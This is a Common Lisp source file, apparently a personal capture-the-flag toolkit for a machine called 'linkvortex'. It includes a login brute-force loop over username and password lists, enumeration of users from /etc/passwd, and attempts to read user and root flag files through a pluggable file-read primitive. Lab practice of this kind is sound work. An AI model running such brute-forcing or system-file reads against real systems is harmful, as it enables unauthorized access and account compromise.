(in-package #:grimoire)

(defparameter *project-root* #P"~/documents/")

(defparameter *project-name* "linkvortex")
(defparameter *project-dir* (merge-pathnames 
                             (str:concat *project-name* "/")
                             *project-root*))

(defparameter *default-users* (load-data "default-users.txt"))
(defparameter *interesting-files* (load-data "interesting-files.txt"))

(defparameter *capacities* (make-hash-table :test #'equal))

(setf *random-state* (make-random-state t))

(defmacro grm/defun (name capacities parameters &body body)
  "create a function and check capacities at the start"
  `(defun ,name ,parameters
     ,@(loop for c in capacities
             collect `(grm/can ,c))
     
     ,@body))

(defun grm/can (type)
  "check if we have a capacity"
  (assert (not (null (gethash type *capacities*)))
          nil
          (format nil "Missing capacity for ~a" type)))

(defmacro grm/use (type &rest args)
  `(funcall (gethash ,type *capacities*) ,@args))

(defun grm/register (type function)
  "register a function as a capacity"
  (setf (gethash type *capacities*) function))

(defun grm/read (path)
  "read a file"
  (grm/use :read path))

;; (defun grm/download (path name)
;;   "read a file into a path"
;;   (ignore-errors 
;;     (a:write-byte-vector-into-file 
;;      (funcall (gethash ) path)
;;      (merge-pathnames 
;;       (asdf:system-relative-pathname
;;        :grimoire (merge-pathnames "output/" name))))
;;     t))

(grm/defun brute-force () (url method usernames passwords)
  (loop for username in usernames
        do (loop for password in passwords
                 do (dex:request url 
                                 :method method
                                 :content `(("username" . ,username)
                                            ("password" . ,password))))))

(grm/defun system-info (:read) ()
  "list all the users from /etc/passwd"
  (grm/read "/etc/os-release"))

(grm/defun all-users (:read) ()
  "list all the users from /etc/passwd"
  (loop for line in (str:lines (grm/read "/etc/passwd"))
        if (not (alexandria:emptyp line))
        collect (car (str:split ":" line))))

(grm/defun users (:read) ()
  "list the users that are not default"
  (let ((all-users (all-users)))
    (remove-if #'(lambda (u) (member u *default-users* :test #'equal)) 
               all-users)))

(grm/defun flag (:read) (&key username root)
  "try to read the flag from user home folders"
  (flet ((try-for-flag (u) 
           (format t "[+] Trying to read ~a's flag...~%" u)
           (ignore-errors
             (str:trim
              (grm/read (format nil "/home/~a/~a.txt" 
                                u (if root "root" "user")))))))
    (if username
        (try-for-flag username)
        (s:~>> (all-users)
               (mapcar #'try-for-flag)
               (remove-if #'null)))))
